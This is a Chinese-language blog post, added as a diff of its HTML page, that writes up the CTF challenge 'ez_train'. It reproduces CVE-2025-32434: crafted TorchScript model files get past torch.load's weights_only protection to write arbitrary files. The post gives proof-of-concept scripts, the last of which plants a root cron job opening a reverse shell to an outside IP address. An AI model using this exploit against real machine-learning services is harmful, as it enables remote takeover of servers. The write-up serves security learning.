@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CVE-2025-32434前言这是一场战队招新赛的题目，当时时间比较紧张，没有信心审🐎找洞，结束后刚好翻到一篇文章，最后看了WP，是吻合的，随即开始复现文章 https:&#x2F;&#x2F;gsbp0.github.io&#x2F;post&#x2F;torch.load%E6%96%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95&#x2F;   复现早期，该漏洞已经被披露，于toech.loads处直接进行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ez_train">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/ez-train/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="CVE-2025-32434前言这是一场战队招新赛的题目，当时时间比较紧张，没有信心审🐎找洞，结束后刚好翻到一篇文章，最后看了WP，是吻合的，随即开始复现文章 https:&#x2F;&#x2F;gsbp0.github.io&#x2F;post&#x2F;torch.load%E6%96%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95&#x2F;   复现早期，该漏洞已经被披露，于toech.loads处直接进行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251120211925653.png">
+<meta property="article:published_time" content="2025-11-20T14:02:04.000Z">
+<meta property="article:modified_time" content="2025-11-21T02:26:47.735Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="复现">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251120211925653.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ez_train</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/Polar%E6%9D%AFjava%E9%83%A8%E5%88%86%E8%A7%A3/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/ez-train/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/ez-train/&text=ez_train"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/ez-train/&is_video=false&description=ez_train"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ez_train&body=Check out this article: https://hexo.sheep-sys-sudo.top/ez-train/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/ez-train/&name=ez_train&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/ez-train/&t=ez_train"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-32434"><span class="toc-number">1.</span> <span class="toc-text">CVE-2025-32434</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-train"><span class="toc-number">1.3.</span> <span class="toc-text">ez_train</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#state-dict-peft%E5%90%8E%E7%BB%AD"><span class="toc-number">1.3.1.</span> <span class="toc-text">state_dict_peft后续</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lora-file-path%E6%BA%AF%E6%BA%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">lora_file_path溯源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E5%88%B0RCE"><span class="toc-number">1.3.3.</span> <span class="toc-text">写文件到RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">2.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ez_train
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-20T14:02:04.000Z" class="dt-published" itemprop="datePublished">2025-11-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/%E5%A4%8D%E7%8E%B0/">复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="CVE-2025-32434"><a href="#CVE-2025-32434" class="headerlink" title="CVE-2025-32434"></a>CVE-2025-32434</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一场战队招新赛的题目，当时时间比较紧张，没有信心审🐎找洞，结束后刚好翻到一篇文章，最后看了WP，是吻合的，随即开始复现文章<br> <code>https://gsbp0.github.io/post/torch.load%E6%96%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</code>  </p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>早期，该漏洞已经被披露，于toech.loads处直接进行pickle反序列化，于是官方推出此参数<code>weights_only</code>来保护用户的安全。在2.6.0版本中正式引入，并且此后版本的torch.load此参数的默认值为True，即开启保护。此漏洞关键在于，可以绕过防护，哪怕不能实现RCE，也可以利用已有操作码，实现任意文件写入<br>又引出一个概念<code>TorchScript</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TorchScript 是 PyTorch 提供的一种中间表示形式，它把原本依赖 Python 的动态图模型转换为可序列化、可优化、可独立运行的静态图。通过 torch.jit.trace 或 torch.jit.script 可以生成 TorchScript 模型，并保存为 .pt 文件，用于跨平台部署（如 C++、移动端）。它既保留了 PyTorch 的灵活性，又解决了性能优化和摆脱 Python 环境依赖的问题。</span><br></pre></td></tr></table></figure></div>
+<p>该漏洞主要复现情况<br>我们有以下demo  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyModule</span>(torch.nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MyModule, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.linear = torch.nn.Linear(<span class="number">10</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> torch.zeros(<span class="number">0</span>)</span><br><span class="line">module=MyModule()</span><br><span class="line">sc=torch.jit.script(module)</span><br><span class="line">sc.save(<span class="string">&quot;pytorch_model.bin&quot;</span>)</span><br><span class="line">newModule=torch.load(<span class="string">&quot;pytorch_model.bin&quot;</span>,weights_only=<span class="literal">True</span>)</span><br><span class="line">modins=newModule()</span><br></pre></td></tr></table></figure></div>
+<p>这里配置2.5.1版本的Torch  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UserWarning: &#x27;torch.load&#x27; received a zip file that looks like a TorchScript archive dispatching to &#x27;torch.jit.load&#x27; (call &#x27;torch.jit.load&#x27; directly to silence this warning)</span><br><span class="line">  warnings.warn(</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div>
+<p>运行成功了~<br>变成<code>eval(print(1))</code>，但是失败了  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">line 466, in create_methods_and_properties_from_stubs</span><br><span class="line">    concrete_type._create_methods_and_properties(        </span><br><span class="line">RuntimeError:</span><br><span class="line">Python builtin &lt;built-in function eval&gt; is currently not supported in Torchscript:</span><br><span class="line">  File &quot;d:\learn2.0\ALL-CTF\venomctf\web_ez_train\text-generation-webui-3.13\import torch.py&quot;, line 9</span><br><span class="line">    def forward(self):</span><br><span class="line">        eval(print(1))</span><br><span class="line">        ~~~~ &lt;--- HERE</span><br><span class="line">        return torch.zeros(0)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>我们在demo中进行了实例化操作，该对象继承自nn.Module，在此过程中会自动的调用对应的forward方法<br>这样的调用却不能调用eval方法  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval方法并不被Torchscript所支持，因为eval没有对应的TorchScript操作符。所以现在我们再次理解到了漏洞的又一部份实质，即只有在Torchscript中存在操作符的方法才能够被编译成TorchScript使用</span><br></pre></td></tr></table></figure></div>
+<p>那我们有哪些可利用的操作符呢？<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251120211925653.png"><br>存在上述两个操作符<br>实现任意文件写入了，后续就是RCE了<br>也可以直接看<code>https://i.blackhat.com/BH-USA-25/Presentations/US-25-Jian-Lishuo-Safe-Harbor-or-Hostile-Waters.pdf</code><br>很有价值<br>目前主要看看<code>ez_train</code>  </p>
+<h3 id="ez-train"><a href="#ez-train" class="headerlink" title="ez_train"></a>ez_train</h3><ul>
+<li>代码审计</li>
+<li>torch.load在weights_only&#x3D;True下的利用<br>关注training.py&#x3D;&gt;<code> state_dict_peft = torch.load(f&quot;&#123;lora_file_path&#125;/adapter_model.bin&quot;, weights_only=True)</code><br>看一下作者给的POC</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import torch</span><br><span class="line">class SimpleModule(torch.nn.Module):</span><br><span class="line">	def __init__(self):</span><br><span class="line">		super(SimpleModule, self).__init__()</span><br><span class="line">		self.linear = torch.nn.Linear(10, 5)</span><br><span class="line">	def items(self):</span><br><span class="line">		torch.save(&quot;test&quot;, &quot;/tmp/1.txt&quot;)</span><br><span class="line">		return torch.zeros(0)</span><br><span class="line">	def forward(self):</span><br><span class="line">		self.items()</span><br><span class="line">		return torch.zeros(0)</span><br><span class="line">module=SimpleModule()</span><br><span class="line">sc=torch.jit.script(module)</span><br><span class="line">sc.save(&quot;evil.bin&quot;)</span><br><span class="line">newModule=torch.load(&quot;evil.bin&quot;,weights_only=True)</span><br><span class="line">newModule.items()</span><br></pre></td></tr></table></figure></div>
+
+<p>我们之前学习了下，这里正是利用的操作符进行任意文件写入，且注意，这个items得看我们实际可能的调用情况，我们看state_dict_peft可能调用了什么方法，然后再去重写，这里还有一个注意点<br>如果想要重写这个后续被调用的方法，需要在forward方法中嵌入一段关于xxx()方法的调用就可以使其被主动编译存留在模型二进制文件中      </p>
+<h4 id="state-dict-peft后续"><a href="#state-dict-peft后续" class="headerlink" title="state_dict_peft后续"></a>state_dict_peft后续</h4><p><code>set_peft_model_state_dict(lora_model, state_dict_peft)</code><br>这里需要导入peft包，追溯方法实现<br>最后跟到这个方法上  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def _insert_adapter_name_into_state_dict(</span><br><span class="line">    state_dict: dict[str, torch.Tensor], adapter_name: str, parameter_prefix: str</span><br><span class="line">) -&gt; dict[str, torch.Tensor]:</span><br><span class="line">    &quot;&quot;&quot;Utility function to remap the state_dict keys to fit the PEFT model by inserting the adapter name.&quot;&quot;&quot;</span><br><span class="line">    peft_model_state_dict = &#123;&#125;</span><br><span class="line">    for key, val in state_dict.items():</span><br><span class="line">        if parameter_prefix in key:</span><br><span class="line">            suffix = key.split(parameter_prefix)[1]</span><br><span class="line">            if &quot;.&quot; in suffix:</span><br><span class="line">                suffix_to_replace = &quot;.&quot;.join(suffix.split(&quot;.&quot;)[1:])</span><br><span class="line">                key = key.replace(suffix_to_replace, f&quot;&#123;adapter_name&#125;.&#123;suffix_to_replace&#125;&quot;)</span><br><span class="line">            else:</span><br><span class="line">                key = f&quot;&#123;key&#125;.&#123;adapter_name&#125;&quot;</span><br><span class="line">            peft_model_state_dict[key] = val</span><br><span class="line">        else:</span><br><span class="line">            peft_model_state_dict[key] = val</span><br><span class="line">    return peft_model_state_dict</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这里调用了对象的items方法，因此如上poc重写即可~</p>
+<h4 id="lora-file-path溯源"><a href="#lora-file-path溯源" class="headerlink" title="lora_file_path溯源"></a>lora_file_path溯源</h4><p>当然这里还有一个问题，我们如何才可以把我们的模型文件上传并被该引用解析呢？<br>走到这里<code>lora_file_path = f&quot;&#123;Path(shared.args.lora_dir)&#125;/&#123;lora_file_path&#125;&quot;</code><br><code>shared.args.lora_dir</code> 路径为<code>user_data/loras</code><br>lora_name 为训练时传入的参数，我们可以控制  也就是说如果 user_data&#x2F;loras&#x2F;lora_name&#x2F;adapter_model.bin 文件存在，就会调用 torch.load 方法进行加载，现在就需要找到什么地方可以上传我们的adapter_model.bin 文件<br>在 model 模块中看到可以从 Hugging Face 仓库远程下载 model 或者 lora，只需要输入 username&#x2F;model 格式即可<br>发现下载路径就在 user_data&#x2F;loras 下面,那么我们可以在我们的 Hugging Face 仓库中上传恶意的adapter_model.bin文件然后进行远程下载保存到 user_data&#x2F;loras 目录下，最后训练的时候进行触发 torch.load<br>这个路径不看WP也不太好知道()</p>
+<h4 id="写文件到RCE"><a href="#写文件到RCE" class="headerlink" title="写文件到RCE"></a>写文件到RCE</h4><p>最后这一步，我们回顾Dockerfile文件<br><code>CMD [&quot;sh&quot;, &quot;-c&quot;, &quot;crond -n&amp; python3 server.py --listen&quot;]</code><br>存在root的定时任务~<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root          # root用户的cron任务<br>即，最后的POC  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleModule</span>(torch.nn.Module):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">super</span>(SimpleModule, <span class="variable language_">self</span>).__init__()</span><br><span class="line">		<span class="variable language_">self</span>.linear = torch.nn.Linear(<span class="number">10</span>, <span class="number">5</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">items</span>(<span class="params">self</span>):</span><br><span class="line">		torch.save(<span class="string">&quot;\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/117.72.34.208/666</span></span><br><span class="line"><span class="string">6 0&gt;&amp;1\n&quot;</span>, <span class="string">&quot;/var/spool/cron/root&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> torch.zeros(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="variable language_">self</span>.items()</span><br><span class="line">		<span class="keyword">return</span> torch.zeros(<span class="number">0</span>)</span><br><span class="line">module=SimpleModule()</span><br><span class="line">sc=torch.jit.script(module)</span><br><span class="line">sc.save(<span class="string">&quot;evil.bin&quot;</span>)</span><br><span class="line">newModule=torch.load(<span class="string">&quot;evil.bin&quot;</span>,weights_only=<span class="literal">True</span>)</span><br><span class="line">newModule.items()</span><br></pre></td></tr></table></figure></div>
+<p>根据步骤上传，加载，等待定时任务执行弹shell即可  </p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><ul>
+<li>从任意文件写到任意文件读</li>
+<li>框架python代码审计，这个很关键</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-32434"><span class="toc-number">1.</span> <span class="toc-text">CVE-2025-32434</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-train"><span class="toc-number">1.3.</span> <span class="toc-text">ez_train</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#state-dict-peft%E5%90%8E%E7%BB%AD"><span class="toc-number">1.3.1.</span> <span class="toc-text">state_dict_peft后续</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lora-file-path%E6%BA%AF%E6%BA%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">lora_file_path溯源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E5%88%B0RCE"><span class="toc-number">1.3.3.</span> <span class="toc-text">写文件到RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">2.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/ez-train/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/ez-train/&text=ez_train"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/ez-train/&is_video=false&description=ez_train"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ez_train&body=Check out this article: https://hexo.sheep-sys-sudo.top/ez-train/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/ez-train/&title=ez_train"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/ez-train/&name=ez_train&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/ez-train/&t=ez_train"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
